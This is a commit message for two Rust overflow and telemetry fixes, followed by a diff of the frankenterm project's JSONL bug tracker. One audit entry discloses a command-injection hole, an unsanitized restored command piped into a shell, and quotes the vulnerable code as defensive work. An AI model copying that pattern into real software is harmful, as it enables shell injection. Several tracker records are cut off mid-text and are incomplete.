message:
fix: event_id clock-skew overflow + telemetry flush_buffer hour boundary (ft-7s0vw)

Two small correctness fixes with the same underlying shape: arithmetic
that silently wrapped / cross-boundary contamination that silently
corrupted telemetry.

## 1. event_id::detect_clock_anomaly — checked_add on future skew

The future-skew check did

    if future_skew_threshold > 0 && current > prev + future_skew_threshold

— which overflows u64 when `prev` is near MAX (corrupt fixture, fuzzer
input, attacker-controlled timestamp in a wire payload). Release
builds wrap silently and the subsequent comparison `current >
tiny_wrapped_value` is true for almost any current value — flooding
telemetry with false "future skew" anomalies. Debug builds panic,
which is worse.

Fix: checked_add with a "fail silent" disposition on overflow —

    if let Some(deadline) = prev.checked_add(future_skew_threshold) {
        if current > deadline {
            return ClockAnomalyResult { is_anomaly: true, ... };
        }
    }

If we can't compute the deadline, disable future-skew detection for
this single observation. No anomaly is reported, no panic is
triggered, and the rest of the detector (rewind, flatline, etc.)
continues to work. The rationale: a prev that's already at/near
u64::MAX is either a bug upstream or an attack — we should not let
it flood downstream dashboards with noise either way.

Three regression tests cover:
  - overflow_with_max_prev (prev=u64::MAX, current=123, threshold=1)
    must NOT be flagged as anomaly.
  - overflow_boundary (prev=u64::MAX-1, current=u64::MAX, threshold=2)
    still NOT flagged (deadline overflow takes the skip branch).
  - normal_future_skew_still_detected (prev=1000, current=5000,
    threshold=100) — flagged, as expected. Pins that the checked-add
    path hasn't accidentally disabled the detector.

## 2. telemetry::flush_buffer — filter snapshots by current hour window

flush_buffer drained the entire circular buffer and aggregated every
snapshot into the current hour bucket — regardless of whether the
snapshot's timestamp actually fell inside the current hour. Buffer
retention + clock-jump interactions meant a long-running store could
have snapshots from the previous hour still sitting in the buffer,
and flushing would silently merge them into the "current hour"
aggregate, skewing every downstream chart.

Fix: filter snapshots by
`snap.timestamp_secs >= hour_ts && snap.timestamp_secs < next_hour_ts`
before aggregating. Out-of-window snapshots are dropped from this
aggregation cycle (they'll either be re-bucketed by a future flush
if retention still has them, or lost if too old — either way, they
won't contaminate the current hour's numbers).

The doc comment updates from "Flush the current circular buffer
contents" to "Flush retained snapshots from the current hour" so
the contract is explicit.

Updated existing test (store_flush_buffer) to use hour-relative
timestamps (hour_ts + 5, hour_ts + 30) instead of the hardcoded
1_700_000_000 — otherwise the test would break whenever the current
hour crossed that boundary (which it already had).

New regression test `store_flush_buffer_ignores_prior_hour_snapshots`
builds a buffer with one prior-hour snapshot + two current-hour
snapshots, flushes, and asserts count=2 and that the aggregate
metrics reflect only the current-hour entries (not an average
weighted against the stale fixture). This is the exact regression
path — the pre-fix behavior would return count=3 with contaminated
averages.

## Beads

Minor metadata (ft-7s0vw transitioned).

Co-Authored-By: Claude <noreply@anthropic.com>

 {"id":"ft-12e8l","title":"[SEV] mux-server Alert-after-PaneRemoved re-inserts HashMap entry, permanent leak","description":"crates/frankenterm-mux-server-impl/src/dispatch.rs:256 processes MuxNotification::Alert by calling handler.per_pane(pane_id), which routes to SessionHandler::per_pane at sessionhandler.rs:282. That function uses HashMap::entry(..).or_insert_with(..) — a get-or-insert. When a MuxNotification::Alert arrives for a pane whose entry was already cleared by Item::Notif(MuxNotification::PaneRemoved) at dispatch.rs:247, the or_insert_with re-creates a fresh PerPane entry. The pane is already gone from mux, so no subsequent PaneRemoved will fire for that pane_id — the entry is a permanent leak.

Concrete interleaving:
  1. Mux fires PaneRemoved(1) followed by (or interleaved with) a delayed Alert{pane_id:1, PaletteChanged} that was enqueued by a config-reload path or a termwiz late-palette flush.
  2. Dispatch loop processes PaneRemoved -> handler.remove_per_pane(1) clears the map entry (line 247).
  3. Dispatch loop processes Alert -> handler.per_pane(1) -> or_insert_with -> re-creates an entry (line 256).
  4. Line 262 schedule_pane_push(1) likewise calls per_pane() internally, reinforcing the stale entry.
  5. No further PaneRemoved for pane 1 is ever emitted (pane already killed). Entry leaks for the lifetime of the ClientSession.

Severity: unbounded growth proportional to (alerts-after-removal × lifetime). Long-lived mux-server clients (editor sessions, persistent SSH mux) with high pane churn accumulate stale entries. Each entry holds a PerPane with notifications Vec, RenderableDimensions, and SurfaceCopy — not large individually but multiplied by churn + uptime, it matters.

Fix: expose a non-inserting accessor SessionHandler::per_pane_if_present(pane_id) -> Option<Arc<Mutex<PerPane>>> and use it for the Alert arm. If the pane isn't tracked, drop the Alert (the client can't render a dead pane anyway). Keep the or_insert_with pathway for client-initiated PDU arms (SendKeyDown, SendPaste, etc.) where insertion on first reference is correct. Also skip the schedule_pane_push for a pane that was just removed (line 262) — same reasoning.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T00:46:06.681760Z","created_by":"jemanuel","updated_at":"2026-04-21T00:49:18.407666Z","closed_at":"2026-04-21T00:49:18.407372Z","close_reason":"Completed: added SessionHandler::per_pane_if_present non-inserting accessor and routed dispatch.rs Alert arm through it. Alert-after-PaneRemoved now drops the stale alert silently instead of re-creating a permanent map entry. Code changes landed in commit 3b45408d (another agent's codec-fuzz commit bundled my dispatch.rs + sessionhandler.rs edits into their push — my 37 lines are present in HEAD). cargo check -p frankenterm-mux-server-impl --offline passed clean in 13.28s during my local verification.","source_repo":".","compaction_level":0,"original_size":0}
 {"id":"ft-1memj.28","title":"[gui][test] GPU rendering tests and visual regression suite","description":"# GPU rendering tests and visual regression suite

## What
Automated tests for the wgpu rendering pipeline: correctness, visual regression detection, and performance validation.

## Why
GPU rendering bugs are invisible to unit tests — they produce wrong pixels, not wrong values. We need screenshot-based comparison to catch rendering regressions in text layout, cursor position, selection highlighting, split pane borders, and floating pane overlays.

## Tests

### Unit Tests (no GPU required)
- `test_cell_vertex_generation` — cell (row, col) produces correct vertex positions
- `test_atlas_rect_lookup` — glyph lookup returns correct UV coordinates
- `test_atlas_eviction_lru` — LRU evicts least-recently-used glyphs
- `test_dirty_rect_merge` — adjacent dirty cells merge into single rect
- `test_dirty_rect_clear_on_present` — dirty rects cleared after frame

### Visual Regression Tests (headless GPU or software renderer)
- `visual_basic_text` — "Hello, World!" renders correctly
- `visual_unicode_cjk` — CJK characters render at double width
- `visual_emoji` — emoji renders correctly (with fallback glyph)
- `visual_box_drawing` — box-drawing characters connect seamlessly
- `visual_cursor_shapes` — block, bar, underline cursor shapes
- `visual_selection_highlight` — selected text has correct background color
- `visual_split_pane_borders` — split pane borders render as clean lines
- `visual_floating_pane` — floating pane renders with shadow/border above tiled panes
- `visual_50_panes` — 50 split panes all render legible text

### Performance Tests
- `perf_frame_time_single_pane` — full-screen pane, measure frame time (target: < 4ms)
- `perf_frame_time_50_panes` — 50 panes, measure frame time (target: < 16ms)
- `perf_atlas_warmup` — time to cache 200 unique glyphs (target: < 100ms)
- `perf_scroll_fps` — continuous scroll, measure sustained fps (target: 60fps)

### E2E Script: `scripts/e2e_gpu_rendering.sh`
```
1. Launch frankenterm-gui in headless mode (--headless)
2. Open shell, run: echo "RENDER_TEST_$(date +%s)"
3. Capture screenshot to /tmp/ft_visual_test.png
4. Compare against golden screenshot (perceptual hash, tolerance for font differences)
5. Open 10 split panes, capture screenshot
6. Verify all 10 panes contain visible text (OCR or pixel sampling)
7. Measure frame time over 100 frames, report p50/p95/p99
8. Report: pass/fail with visual diff images on failure
```

## Golden Screenshot Management
- Golden screenshots stored in `tests/golden/gpu/`
- Updated via `BLESS=1 cargo test` (like insta crate)
- Platform-specific goldens: `tests/golden/gpu/macos/`, `tests/golden/gpu/linux/`

## Acceptance Criteria
- Visual regression suite runs in CI headlessly
- Frame time p99 < 16ms for single pane
- Font atlas handles full Unicode BMP without crash
- Visual diff images attached to failing CI runs for diagnosis","notes":"Reopened: stalled 13-22 days with no recent activity.  {"id":"ft-1p752","title":"[testing-fuzzing] crash-detector fuzz target for frankenterm-escape-parser Parser::parse raw bytes","description":"# Motivation

`frankenterm_escape_parser::Parser::parse(&[u8], callback)` is the
state machine that consumes untrusted terminal output for every
captured pane. The crate has 2 existing fuzz targets:

  * `termwiz_csi_parser.rs` — structure-aware around CSI sequences
  * `osc_marker_parser.rs`  — structure-aware around OSC markers

Neither is a plain raw-bytes crash detector. State-machine paths
that the structure-aware generators don't reach (SOS/PM/APC,
partial DCS/Sixel streams, intermediate-byte boundary transitions,
pathological ESC chains) go uncovered.

# Scope

New fuzz target `fuzz/fuzz_targets/escape_parser_raw.rs` that feeds
arbitrary bytes into `Parser::parse` with a no-op callback, asserts
no panic / no infinite loop / no allocator blow-up. Size-bounded at
64 KiB to keep iteration latency low (matches the existing raw-bytes
targets in this repo).

# Invariants (beyond crash-freedom)

1. `parse` consumes all bytes it's fed (state machine never strands).
2. The callback is invoked at most some finite number of times per
   input byte (linear, not quadratic).
3. `parse_as_vec` round-trips `parse` — calling both on the same
   input produces identical Action counts.

# Seed corpus

Empty + minimal ESC + malformed-CSI + OSC-with-nulls + APC + nested
DCS partial stream. 4-5 seeds.

# Build

    cargo +nightly fuzz run escape_parser_raw -- -runs=100000

Targets 2000+ exec/s given escape parsing is hot-path byte-driven

 {"id":"ft-2guux","title":"reality-check gaps","description":"Reality-check sweep of the repo (pane 5, session 2026-04-20) against
README.md + AGENTS.md + docs/ft-xbnl0-verification-contract.md. Most
capability claims match the code; the four material gaps below are
worth tracking. No fixes this tick — documentation-only finding.

Methodology: read the README "Supported Surface Matrix" and "Quick
Example", then grep the CLI command tree at `crates/frankenterm/src/main.rs`,
the MCP tools at `crates/frankenterm-core/src/mcp_tools.rs`, the web
endpoints at `crates/frankenterm-core/src/web/router.rs`, and the
runtime layer at `crates/frankenterm-core/src/runtime.rs` +
`runtime_compat.rs`.

Findings (severity ranked):

G1 [MEDIUM] Watch-daemon asupersync claim vs actual reactor dependency
  Evidence:
    - README.md:38-41 "runtime model is asupersync-native",
      "runtime_compat remains as an audited boundary".
    - crates/frankenterm-core/tests/runtime_labruntime.rs:13-18
      explicit comment:
        "Full ObservationRuntime integration tests (startup,
         shutdown, discovery, capture) require the runtime_compat::task
         module to be migrated from tokio::spawn to asupersync::spawn.
         Until that migration completes, ObservationRuntime::start()
         cannot run under asupersync RuntimeFixture because task::spawn
         → tokio::spawn panics without a tokio reactor."
    - runtime.rs:184 uses `crate::runtime_compat::task::spawn_with_cx`
      which still goes through the tokio-backed path when the
      `asupersync-runtime` feature is disabled.
  Why it matters: the primary operator surface (`ft watch`) cannot be
  exercised end-to-end under a pure asupersync runtime fixture today.
  The README is honest that runtime_compat is "an audited boundary";
  the specific gap is that the watch daemon's task spawns transit
  that boundary. Tracked by the ft-xbnl0.2.x epic but worth surfacing
  as a doc clarification on README.md:38-41 ("native with a named
  quarantine").

G2 [MEDIUM] `ft restart` is Unix-only, not disclosed in the support matrix
  Evidence:
    - README.md:124 "Session persistence | Supported with backend
      prerequisite | Snapshots, session inspection, restore, and
      `ft session doctor` are implemented".
    - crates/frankenterm/src/main.rs:27032 emits:
        "ft restart is currently supported only on Unix platforms."
      and exits 1 on non-Unix; the full `execute_restart_workflow`
      call path sits inside `#[cfg(unix)]` at line 27036.
  Why it matters: a Windows operator following the README's
  session-persistence story will hit this only at runtime.
  Supportable via an asterisk in the matrix or an explicit
  "Unix-only" caveat in the `ft restart` section.

G3 [LOW] Performance claims lack linked artifacts
  Evidence:
    - README.md:51 "<50ms lag" for delta extraction.
    - README.md:62 "keeps 200+ panes under 1GB vs 4GB+".
    - README.md:113 "TOON reduces token consumption by 40-60%".
    - No matching benchmark artifact path in docs/ referenced from
      these claims; the verification-contract doc at docs/ft-xbnl0-
      verification-contract.md mandates Level C artifact bundles for
      soak/perf-adjacent claims but the README does not cite any.
  Why it matters: performance claims presented as current fact in
  the README should either cite an artifact bundle or be softened to
  "target" / "design goal" until evidence lands. Non-blocking.

G4 [LOW] `SEND_OSC_SEGMENT_LIMIT = 200` silently bounds OSC133 state
  Evidence:
    - crates/frankenterm-core/src/mcp.rs:188
        `const SEND_OSC_SEGMENT_LIMIT: usize = 200;`
    - mcp.rs:288-310 `derive_osc_state_from_storage` walks only the
      last 200 segments. If OSC133 markers span further back, the
      derived state is silently incomplete; the helper returns
      `Ok(None)` with no gap marker.
  Why it matters: a quiet-pane edge case (no activity for >200
  segments) would yield an incorrect alt-screen / prompt state via
  the MCP surface without a visible warning. Worth either documenting
  the bound or recording a `markers_unknown_due_to_window_limit`
  signal.

Non-gaps verified present and matching claims:

  - `ft robot state` / `state --include-text`: main.rs:2375-2391
  - `ft robot search --mode {lexical,semantic,hybrid}`:
      main.rs:4633-4711 enum + From impl; semantic/hybrid properly
      gated behind `semantic-search`/`frankensearch` features.
  - `ft mcp serve`: main.rs:33124
  - `ft web` + `/stream/events` + `/stream/deltas`:
      web/router.rs:65,70 — streaming exists; README's
      "more than 'health only'" claim is accurate.
  - `ft distributed agent`: main.rs:165-168 under
      `#[cfg(feature = "distributed")]`.
  - `ft session doctor`, snapshot save/restore/list/inspect/diff:
      SnapshotCommands + SessionCommands enums defined around
      main.rs:4207.
  - `ft tx run`/`tx rollback`/`tx plan`/`tx show`: main.rs:21114+
      via `execute_tx_run_with_executor`.
  - Policy "21 subsystems": unified_telemetry.rs:242 comment; actual
      PolicyEngine struct at policy.rs:3466-3517 declares ~22
      subsystem-shaped fields. Close-enough; no drift worth fixing.

 {"id":"ft-7axpo","title":"protocol_recovery deterministic jitter defeats thundering-herd protection","description":"# [HIGH] protocol_recovery: fake jitter

**Subsystem:** protocol_recovery / retry
**File:** crates/frankenterm-core/src/protocol_recovery.rs (`RecoveryConfig::delay_for_attempt`)

## The hole

\`\`\`rust
let jitter_seed = ((attempt as f64 * 7.13).sin().abs()).mul_add(2.0, -1.0);
let jittered_ms = jitter_range.mul_add(jitter_seed, capped_ms).max(1.0);
\`\`\`

`sin(attempt * 7.13)` is fully deterministic. Every RecoveryEngine in the
process produces the **same** delay for a given attempt number. In a large
agent swarm, if 100 panes lose their mux connection simultaneously (mux
server restart), every engine schedules identical retry timings: attempt=0
→ delay_X, attempt=1 → delay_Y, etc. They all pile in at the same
instants — the exact thundering-herd collision that jitter exists to
prevent.

Pre-fix: `jitter_fraction: 0.1` looked like 10% decorrelation but produced
zero decorrelation across engines.

## Fix

Replaced the deterministic `sin()`-derived seed with
`rand::rng().random_range(-jitter_range..=jitter_range)` — same approach
already used in `retry.rs::RetryPolicy::delay_for_attempt`. Consistent with
how the other module in the same crate spells jitter.

Kept the `jitter_range > 0.0` fast-path so `jitter_fraction == 0.0` is
still bit-exact deterministic (tests rely on this).

## Caller impact

`RecoveryEngine::execute` uses `delay_for_attempt` to sleep between
protocol-error retries. No test depends on deterministic jitter
(`delay_for_attempt_*` tests set `jitter_fraction: 0.0`), so the fix is
drop-in.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T17:26:26.938808Z","created_by":"p3-review-audit","updated_at":"2026-04-21T17:43:28.102548Z","closed_at":"2026-04-21T17:43:28.102198Z","close_reason":"Fix already shipped in fdd1e817; regression tests added in bf4a63b9 (delay_for_attempt_jitter_is_randomized_across_calls + delay_for_attempt_zero_jitter_is_deterministic).","source_repo":".","compaction_level":0,"original_size":0,"labels":["protocol-recovery","reliability","retry"]}

 {"id":"ft-7ojbj","title":"rate_limit_tracker: parse_retry_after can produce Duration that panics Instant + cooldown","description":"# Defect

`crates/frankenterm-core/src/rate_limit_tracker.rs:441-473` `parse_retry_after` has no upper bound on the parsed duration.

Plain-number path at :452-454:
```rust
if let Ok(secs) = text.parse::<u64>() {
    return Some(Duration::from_secs(secs));
}
```

'N unit' path at :458-469 has a `checked_mul` guard, but the plain number path returns `Duration::from_secs(u64::MAX)` untouched (u64::MAX secs ≈ 584 billion years).

The returned Duration flows into `PaneRateLimitState::record_event` at :164:
```rust
let expiry = event.detected_at + event.cooldown;
```

`Instant + Duration` panics when the sum overflows the platform's underlying representation. On macOS/Linux Instant is backed by clock_gettime timespec/uptime — adding ~584B years to a fresh Instant will overflow.

# Reachability

`retry_after_text` reaches record_event from pattern detection output. `trigger_retry_after` (workflows/builtin_workflows.rs) extracts the string from agent-emitted rate-limit messages. A malformed provider response or adversarial agent output ('Retry-After: 18446744073709551615') would panic the tracker on record.

# Existing tests

`parse_retry_after_overflow_returns_none` at :515-518 covers the 'N unit' checked_mul path with 'u64::MAX hours', but NOT the plain-number path with 'u64::MAX'. That path currently returns `Some` unclamped.

# Fix

Clamp parse_retry_after to a sane max (24h ceiling — legitimate provider Retry-After values never exceed 1h in practice, and any longer wait is a signal to bail rather than block the tracker). Apply the cap uniformly to plain-number and 'N unit' paths. Also clamp DEFAULT_COOLDOWN_SECS fallback if it ever grows.

Add regression test: parse_retry_after_plain_u64_max_is_clamped asserts the plain-number path returns a Duration ≤ the cap, not None and not u64::MAX.

# Severity

MEDIUM — requires adversarial/malformed provider input to trigger. Tracker is behind rate_limit_tracker.lock() in workflows/builtin_workflows.rs so the panic takes down the workflow task but is scoped to one pane's rate-limit processing. Fix is trivial: one `.min(MAX_COOLDOWN)` call plus one test.","status":"closed","priority":2,"issue_type":"bug","created_at":"2026-04-22T09:40:08.211722Z","created_by":"jemanuel","updated_at":"2026-04-22T09:50:10.213965Z","closed_at":"2026-04-22T09:50:10.213664Z","close_reason":"Landed in 7998d1a4 (fix(rate_limit_tracker): clamp parsed Retry-After at MAX_COOLDOWN_SECS)","source_repo":".","compaction_level":0,"original_size":0}
+{"id":"ft-7s0vw","title":"event_id::detect_clock_anomaly overflows on prev + future_skew_threshold","description":"## Defect

\`crates/frankenterm-core/src/event_id.rs:205\` computes
\`prev + future_skew_threshold\` without overflow protection. In release
builds u64 wraps silently; in debug builds the unchecked add panics.
Either way, a pathological or adversarial \`prev\` value breaks the
future-skew branch.

## Concrete failure path

1. Caller invokes \`detect_clock_anomaly(current, prev, threshold)\` where
   \`prev + threshold\` overflows \`u64\`.
2. Easy reach: replay/import flows feeding \`recorded_at_ms = u64::MAX\` from
   a corrupt fixture, fuzzer, or attacker-controlled input. Also reachable
   via legitimate-but-distant clock sources (UNIX epoch micros around year
   586,524 if anyone reaches that, or any monotonic clock that has been
   bumped by a process bug into the high u64 range).
3. **Release build:** \`prev + threshold\` wraps to a tiny value. The
   condition \`current > tiny_value\` is now true for almost any \`current\`,
   so the function returns \`is_anomaly: true\` for every subsequent valid
   timestamp — flooding telemetry with false-positive "future skew"
   reports and potentially triggering downstream remediation that should
   not have fired.
4. **Debug build:** unchecked add panics (\`attempt to add with overflow\`),
   killing whatever thread was processing the recorder pipeline.
5. \`ClockAnomalyTracker::observe\` always updates the baseline
   ("Updates the baseline regardless") — so a single malicious or
   transiently-high \`current\` value sticks around and continues to
   poison overflow checks against subsequent observations.

## Severity rationale

- Silent wrong answer in release; thread-killing panic in debug.
- Adversary-reachable via fixture/replay/fuzz inputs.
- Same arithmetic-poison family as ft-761tz (disk_pressure NaN) and
  ft-yskcu (continuous_backpressure NaN): a hostile or pathological
  numeric input cascades into permanently-wrong tier/anomaly outputs
  with no self-recovery.

## Fix sketch

1. Replace \`prev + future_skew_threshold\` with \`prev.checked_add(threshold)\`.
2. On overflow, treat as "no future-skew anomaly" — we cannot prove a
   timestamp is too far in the future relative to a near-MAX baseline,
   so the only sound default is \"don't flag\". Same disposition as
   ft-761tz: when the math itself becomes unreliable, fail toward
   silence rather than toward false positives.
3. Regression tests covering: (a) overflow with threshold=1 and
   prev=u64::MAX → no anomaly, no panic; (b) overflow with threshold=
   u64::MAX and small prev → no anomaly, no panic; (c) the existing
   future-skew path still fires when math is in range.

## Scope

\`crates/frankenterm-core/src/event_id.rs\` only. No cross-crate API
changes. \`ClockAnomalyTracker::observe\` baseline-update behavior is
intentional and out of scope.","status":"in_progress","priority":2,"issue_type":"bug","assignee":"pane0","created_at":"2026-04-22T11:30:32.110899Z","created_by":"jemanuel","updated_at":"2026-04-22T11:30:36.893553Z","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-ibtjf","title":"[gh-52] build.rs must populate FT_WEZTERM_VENDORED_REV for path-dep workspace layout","description":"## Problem (GitHub #52)

After the fail-closed guard from #44, `ft doctor` unconditionally reports `[ERR] WezTerm vendored - vendored commit not recorded` on every clean-machine `cargo install --git ...` build. Root cause:

- `crates/frankenterm-core/build.rs` only extracts vendored commit from `Cargo.lock` entries whose `source = "git+...#<hash>"` fragment carries a commit.
- The default workspace layout declares `mux` and `wezterm-term` as **path dependencies** (`frankenterm/mux`, `frankenterm/term`), so Cargo does NOT emit a `source` field for them.
- `select_vendored_metadata` returns `(None, None, None)`, no `cargo:rustc-env=FT_WEZTERM_VENDORED_REV=...` is emitted, `option_env!("FT_WEZTERM_VENDORED_REV")` resolves to `None`, and `vendored.rs` reports `Incompatible` at runtime.

Runtime behavior is safe (ft correctly falls back to CLI backend) but the permanent `[ERR]` on default builds is a UX regression that hides real incompatibilities.

## Fix direction

In `crates/frankenterm-core/build.rs`, add a path-dep fallback branch to `select_vendored_metadata`:

1. If `mux.source.is_none()` (path dep), resolve the vendored subdir (`frankenterm/mux` relative to workspace root) and run `git -C <that-dir> rev-parse HEAD` to populate the commit.
2. Handle the case where the workspace is not a git checkout (e.g. cargo install tarball) — in that case, either fall back to a deterministic build-time hash (e.g. `sha256` of the mux crate source) or treat as "local-path-build" sentinel so vendored.rs can accept it without [ERR].
3. Add `cargo:rerun-if-changed=` entries for `frankenterm/mux/Cargo.toml` and `frankenterm/term/Cargo.toml` so the metadata refreshes on vendored bumps.
4. Emit `FT_WEZTERM_VENDORED_VERSION` + `FT_WEZTERM_VENDORED_SOURCE` in the path-dep branch too.

## Acceptance criteria

1. `cargo install --git https://github.com/Dicklesworthstone/frankenterm.git --bin ft frankenterm && ft doctor` no longer produces `[ERR] WezTerm vendored - vendored commit not recorded`.
2. `ft doctor` reports a real `[OK]` or a meaningful vendored mismatch when the path-dep tree has drifted.
3. Runtime vendored compatibility guard (`vendored.rs:155-166`) continues to fail-closed for truly-missing metadata — path-dep fallback must not weaken it.
4. Build script handles non-git workspaces (cargo-install tarball extraction) without panicking.
5. Unit test or build-script harness covers: git-path-dep / non-git-path-dep / git+hash / missing-both.

## Reporter

GitHub user JordanChoo — https://github.com/Dicklesworthstone/frankenterm/issues/52","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T02:27:51.238506Z","created_by":"jemanuel","updated_at":"2026-04-21T02:50:52.805074Z","closed_at":"2026-04-21T02:50:52.804717Z","close_reason":"Fixed in 3174399d (build.rs path-dep fallback + non-git sentinel + 8-test harness)","source_repo":".","compaction_level":0,"original_size":0}
-{"id":"ft-ih4tm","title":"[MEDIUM] defer_fts_triggers=false is not reversible: triggers stay dropped after enabling once (ft-wk5fo follow-up)","description":"# Defect

## Concrete failure path

File: `crates/frankenterm-core/src/storage.rs`.

d74401c6 landed `StorageConfig.defer_fts_triggers` (ft-wk5fo). The intent is a reversible opt-in: flip to `true` to trade FTS freshness for write-path latency, flip back to `false` to restore synchronous indexing. The inline comment at line 6006 says as much:

> The triggers can be re-created by re-opening with `defer_fts_triggers: false`

That claim is wrong. Concrete interleaving:

1. Operator opens DB with `defer_fts_triggers: true` on an up-to-date schema (`user_version == SCHEMA_VERSION`).
2. `initialize_schema` returns early at line 4315 (no SQL executed, up-to-date path).
3. The explicit `DROP TRIGGER IF EXISTS output_segments_ai/ad/au` at line 6010 runs — triggers gone.
4. Operator flips config to `defer_fts_triggers: false` and restarts.
5. `initialize_schema` again short-circuits at line 4315.
6. Line 6010 is skipped (flag is false). **No `CREATE TRIGGER IF NOT EXISTS` runs.**
7. Database silently stays in deferred mode; the operator's `false` setting is a no-op.

The inline comment at line 6007 hints the author knew: 'this commit ships the opt-in direction only; reverting would require re-running SCHEMA_SQL or the operator dropping the DB.' That matches reality but contradicts the line-6006 'can be re-created by re-opening' claim — and leaves the config behaving non-intuitively for operators.

## Severity rationale

- Not a crash or data loss.
- Silent wrong answer: operator flips back to `false`, expects synchronous FTS, gets deferred.
- One-way-door config is a known anti-pattern. Easy fix.

## Fix sketch

Make the open path truly bidirectional. On every open, after `initialize_schema` returns:

* If `defer_fts_triggers == true`: `DROP TRIGGER IF EXISTS ...` (idempotent).
* If `defer_fts_triggers == false`: `CREATE TRIGGER IF NOT EXISTS ...` using the same SQL the SCHEMA_SQL block defines.

Factor the trigger SQL into one private const referenced by both branches so SCHEMA_SQL and the re-create branch cannot drift.

## Tests

* ft_ih4tm_defer_fts_triggers_roundtrip — open with true, verify triggers dropped, close, reopen with false, verify triggers re-created.
* ft_ih4tm_defer_fts_triggers_idempotent_reopen — open with same flag twice back-to-back, no spurious SQL errors, trigger state stable.

## Scope

Single file (`storage.rs`). No API break (`defer_fts_triggers` already public, default `false`).","status":"in_progress","priority":2,"issue_type":"bug","created_at":"2026-04-22T11:27:12.433144Z","created_by":"jemanuel","updated_at":"2026-04-22T11:27:32.954265Z","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-jqvg5","title":"Resolve frankenterm-core clippy -D warnings gate","description":"# Workspace-level clippy gate

## Background
Discovered during ft-xbnl0.2.4 tick 356 verification sweep. The
`frankenterm-core` crate reports **17 clippy errors** when run with
`-D warnings`:

    cargo clippy --no-deps -p frankenterm-core \\
        --features distributed,asupersync-runtime,web \\
        --lib --tests -- -D warnings

All 17 errors are in files **unrelated to ft-xbnl0.2.4**:

- `src/ipc.rs`
- `src/robot_sdk_contracts.rs`
- `src/runtime.rs`
- `src/snapshot_engine.rs`
- `src/ui_query.rs`
- `src/workflows/engine.rs`
- `src/workflows/runner.rs`

These are from recent commits by other agents.

## Why not fix in ft-xbnl0.2.4
AGENTS.md explicitly instructs "NEVER ... disturb in ANY way the work of
other agents." The violations may be:
- awaiting `#[allow(...)]` annotations from their owners
- pending intentional restructures
- already planned for cleanup

Touching them without coordination could override the owners' planned
solutions.

## Fix categories observed (examples)
- `clippy::duration-suboptimal-units` — `Duration::from_millis(2_000)` should be `from_secs(2)`
- `clippy::redundant-closure` — `|| crate::foo()` should just be `crate::foo`
- `clippy::semicolon-if-nothing-returned` — trailing unit-valued expression without semicolon
- Several others (see `cargo clippy` output at time of fix)

## Suggested approach
For each file, coordinate with the owning agent (via Agent Mail or by checking
recent git history for active work) before applying fixes. Prefer:

 {"id":"ft-kcsae","title":"[mor:performance-engineering] storage.rs at 31k lines — is FTS5 indexing synchronous on the capture path?","description":"# Observation

storage.rs is 31,648 lines (largest module in the core crate). It
owns a SQLite connection with WAL, drives FTS5 virtual tables for
the lexical-search surface, and handles retention sweeps
(\`database_stats(..., retention_days)\` at line 3758).

FTS5 writes are expensive — they rebuild inverted-index pages on
INSERT/UPDATE. If the capture path writes rows AND the FTS5 trigger
runs synchronously in the same transaction, every captured segment
pays the indexing cost before the write returns, which is pushed
onto the hot path at the very point where backpressure is trying
to keep up.

Not verified in this pass — just the shape of the concern given
the size of storage.rs and the presence of FTS5. Worth a targeted
read of the capture-write code path.

# Question

Three measurements that would clarify whether this matters:

1. Is there a "defer FTS5 indexing to a background task" path, or
   do FTS5 triggers fire in the capture-write transaction?
2. What's the p99 latency of \`insert_pane_output\` under a 200-pane
   load with FTS5 enabled vs disabled?
3. Is there an async/batch FTS5 index-catchup task that operators
   can offload indexing to?

If (1) is "synchronous" and (2) shows meaningful gap between
enabled/disabled, then an async-index mode is probably the fattest
win in the capture subsystem. Memory budget permits: a lag of
seconds in search freshness is almost always an acceptable trade
for linear-capture throughput during incidents.

# Structural note

31k lines in one module suggests the subsystem has grown through
absorption rather than redesign. Might be worth sketching the
module boundaries as a separate planning exercise before
optimizing; "where does latency go when we write a segment" is a
question that should have a one-page answer.","status":"closed","priority":3,"issue_type":"question","created_at":"2026-04-21T17:36:06.994443Z","created_by":"mor-review","updated_at":"2026-04-21T18:01:07.436214Z","closed_at":"2026-04-21T18:01:07.435839Z","close_reason":"Answered. Q1 (sync or async?): SYNCHRONOUS — three AFTER INSERT/DELETE/UPDATE triggers at storage.rs:169-180 fire inside every append_segment_sync transaction (storage.rs:12308). Q2 (p99 measurement): not run — needs a load harness. Q3 (async catchup available?): infrastructure EXISTS (fts_pane_progress table storage.rs:472 + sync_fts_on_startup storage.rs:16131 + FtsSyncConfig storage.rs:2363) but is wired only for startup recovery and explicit rebuild, NOT for live capture. Follow-up for the actual move-to-deferred work filed as ft-wk5fo with concrete plan + risk notes + measurement prerequisite.","source_repo":".","compaction_level":0,"original_size":0,"labels":["fts5","mor","performance","storage"]}
 {"id":"ft-kegvt","title":"[MEDIUM] launch_agent pipes restored `command` into shell via send_text without CR/LF sanitization","description":"Found during /security-audit-for-saas pass #4 (pane 5, 2026-04-21).

## Summary
`restore_process.rs::launch_agent_legacy` (line 625) and
`launch_agent_cx` (line 648) build the command string for a restored
pane by `format!("{command}\r", ...)` and then sending it to the
pane shell via `self.wezterm.send_text(pane_id, &full_cmd)`. The
pane shell is an active interactive shell (not an argv-isolated
subprocess), so any `\r` or `\n` in `command` injects additional
lines into the shell's input buffer.

## Evidence
- crates/frankenterm-core/src/restore_process.rs:625
  ```rust
  async fn launch_agent_legacy(
      &self,
      pane_id: u64,
      command: &str,          // <- from RestoredPaneState.command
      cwd: &Path,
      agent_type: &str,
  ) -> Result<(), String> {
      let cd_cmd = format!("cd {}\r", shell_escape(cwd));
      self.wezterm.send_text(pane_id, &cd_cmd).await...;
      ...
      let full_cmd = format!("{command}\r");   // <- unsanitized
      self.wezterm.send_text(pane_id, &full_cmd).await...;
  ```
- crates/frankenterm-core/src/restore_process.rs:648 — the cx-first
  variant has the same shape and the same gap.
- Note the asymmetry: `cwd` IS passed through `shell_escape(cwd)`,
  but `command` is not. The cd helper got the defensive treatment;
  the main command did not.

## Impact / trust boundary
`RestoredPaneState.command` is loaded from the SQLite session DB
at `session_restore.rs:892` where `state.command` is read from the
`mux_pane_state` table. Attack paths requiring this field to be
attacker-controlled:

1. DB write access (already implies full-user compromise; out of
   scope as a net-new threat).
